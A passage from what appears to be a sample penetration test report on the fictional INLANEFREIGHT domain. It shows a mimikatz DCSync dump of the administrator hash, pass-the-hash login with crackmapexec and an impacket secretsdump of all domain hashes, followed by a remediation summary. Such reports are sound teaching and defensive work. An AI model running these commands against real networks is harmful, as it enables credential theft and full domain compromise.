{"text": "> https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # lsadump::dcsync /user:INLANEFREIGHT\\administrator [DC] 'INLANEFREIGHT.LOCAL' will be the domain [DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server [DC] 'INLANEFREIGHT\\administrator' will be the user account [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) [DC] ms-DS-ReplicationEpoch is: 1 Object RDN : Administrator ** SAM ACCOUNT ** SAM Username : Administrator Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) Account expiration : Password last change : 2/12/2022 9:32:55 PM Object Security ID : S-1-5-21-1666128402-2659679066-1433032234-500 Object Relative ID : 500 Credentials: Hash NTLM: e4axxxxxxxxxxxxxxxx1c88c2e94cba2 Figure 15: Performing the DCSync Attack The tester confirmed this access by authenticating to a Domain Controller in the INLANEFREIGHT.LOCAL domain. $ sudo crackmapexec smb 192.168.195.204 -u administrator -H e4axxxxxxxxxxxxxxxx1c88c2e94cba2 SMB 192.168.195.204 445 DC01 [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 192.168.195.204 445 DC01 [+] INLANEFREIGHT.LOCAL\\administrator e4axxxxxxxxxxxxxxxx1c88c2e94cba2 Figure 16: Authenticating to Domain Controller With this access it was possible to retrieve the NTLM password hashes for all users in the domain. The tester then performed offline cracking of these hashes using the Hashcat tool. A domain password analysis showing several metrics can be found in the appendices of this report. 15\\n$ secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cxxxxxxxxxx7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4180f1f4xxxxxxxxxx0e8523771a8c::: mssqlsvc:1106:aad3b435b51404eeaad3b435b51404ee:55a6c7xxxxxxxxxxxx2b07e1::: srvadmin:1107:aad3b435b51404eeaad3b435b51404ee:9f9154fxxxxxxxxxxxxx0930c0::: pramirez:1108:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9xxxxxxxxxxxxxed5c58::: <SNIP> Figure 17: Dumping Domain Credentials 16\\nRemediation Summary As a result of this assessment there are several opportunities for Inlanefreight to strengthen its internal network security. Remediation efforts are prioritized below starting with those that will likely take the least amount of time and effort to complete. Inlanefreight should ensure that all remediation steps and mitigating controls are carefully planned and tested to prevent any service disruptions or loss of data. Short Term  [Finding 2] – Set strong (24+ character) passwords on all SPN accounts  [Finding 5] – Change the default admin credentials for the Tomcat Manager  [Finding 7] – Disable Directory Listing on the affected web server  Enforce a password change for all users because of the domain compromise Medium Term  [Finding 1] – Disable LLMNR and NBT-NS wherever possible  [Finding 2] – Transition from SPNs to Group Managed Service Accounts (gMSA) wherever possible  [Finding 3] – Implement a solution such as the Microsoft Local Administrator Password Solution\" (LAPS)  [Finding 4] – Enhance the domain password policy  [Finding 4] – Consider implementing an enterprise password manager  [Finding 5] – Consider limiting access to the Tomcat Manager to localhost or specific IP Addresses  [Finding 6] – Perform a network file share audit  [Finding 8] – Enhance network logging and monitoring  [Finding 8] – Implement an enterprise endpoint detection & response solution Long Term  Perform ongoing internal network vulnerability assessments and domain password audits  Perform periodic Active Directory security assessments  Educate systems and", "metadata": {"doc_id": "Hack the Box - sample-penetration-testing-report-template", "chunk_id": 8}}